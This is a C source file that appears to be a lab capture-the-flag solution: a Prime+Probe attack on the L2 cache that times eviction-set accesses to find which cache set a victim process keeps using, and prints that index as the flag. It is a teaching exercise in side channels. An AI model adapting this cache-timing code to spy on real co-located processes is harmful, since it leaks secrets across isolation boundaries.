/******************************************************
 * attacker.c - Capture the Flag using L2 Cache Prime+Probe
 *
 * This attacker scans every L2 cache set candidate and determines
 * which one exhibits a higher average latency due to victim interference.
 * The victim process continuously accesses its eviction set (for its
 * secret cache set index) in an infinite loop. Hence, the attacker’s
 * measurements on that candidate will be slower.
 *
 * Assumptions:
 *  - NUM_L2_CACHE_SETS is defined (the number of L2 cache sets)
 *  - EV_SET_SIZE is defined (number of addresses in an eviction set)
 *  - get_buffer(), get_partial_eviction_set() and measure_one_block_access_time()
 *    are provided in the lab’s util files.
 *
 * Build:
 *  Use the provided Makefile in Part3-CTF, e.g. by running:
 *      make run_attacker
 *
 * Testing:
 *  In one terminal, run:  make run_victim-N
 *  In another terminal, run: make run_attacker
 *  The attacker should print the detected flag (i.e. the target L2 set index).
 ******************************************************/

 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
 #include "util.h" // Ensure this header defines the prototypes and constants
 
 // Number of times to repeat a measurement for each cache set candidate.
 // Adjust this value if your measurements are too noisy.
 #define NUM_PROBES 1000
 
 int main(void) {
     // Step 1: Allocate a hugepage-backed buffer.
     char *buffer = get_buffer();
     if (buffer == NULL) {
         fprintf(stderr, "Error: Failed to allocate buffer via get_buffer()\n");
         exit(EXIT_FAILURE);
     }
 
     // Array to store the average measured latency (in cycles) for each L2 cache set candidate.
     uint64_t avg_latency[NUM_L2_CACHE_SETS] = {0};
 
     // Step 2: For each candidate L2 cache set, construct an eviction set and measure access latency.
     for (int set_index = 0; set_index < NUM_L2_CACHE_SETS; set_index++) {
         uint64_t latency_sum = 0;
         // Prepare an eviction set for this candidate cache set.
         // eviction_set is an array of pointers; its size is EV_SET_SIZE.
         char *eviction_set[EV_SET_SIZE] = {0};
         get_partial_eviction_set(eviction_set, set_index);
 
         // Repeat the prime/probe measurement to average out noise.
         for (int probe = 0; probe < NUM_PROBES; probe++) {
             // Prime phase: sequentially access every address in the eviction set.
             // This brings them into the cache.
             for (int i = 0; i < EV_SET_SIZE; i++) {
                 volatile uint8_t dummy = eviction_set[i][0];  // volatile read to enforce access
                 (void)dummy;  // prevent unused variable warning
             }
 
             // (Optional) Insert a memory fence if necessary to prevent instruction reordering.
             // e.g., asm volatile("lfence" ::: "memory");
 
             // Probe phase: measure the access latency for one element in the eviction set.
             uint64_t t = measure_one_block_access_time((uint64_t *)eviction_set[0]);
             latency_sum += t;
         }
         // Record the average latency for this cache set candidate.
         avg_latency[set_index] = latency_sum / NUM_PROBES;
     }
 
     // Step 3: Identify the cache set with the highest measured latency.
     int detected_flag = 0;
     uint64_t max_latency = 0;
     for (int set_index = 0; set_index < NUM_L2_CACHE_SETS; set_index++) {
         if (avg_latency[set_index] > max_latency) {
             max_latency = avg_latency[set_index];
             detected_flag = set_index;
         }
     }
 
     // (Optional) Print detailed latencies for all sets for debugging purposes.
     for (int set_index = 0; set_index < NUM_L2_CACHE_SETS; set_index++) {
         printf("Cache Set %3d: Average Latency = %llu cycles\n", set_index, avg_latency[set_index]);
     }
     
     // Step 4: Output the detected secret flag.
     printf("Detected victim flag (target L2 cache set index): %d\n", detected_flag);
 
     return 0;
 }
 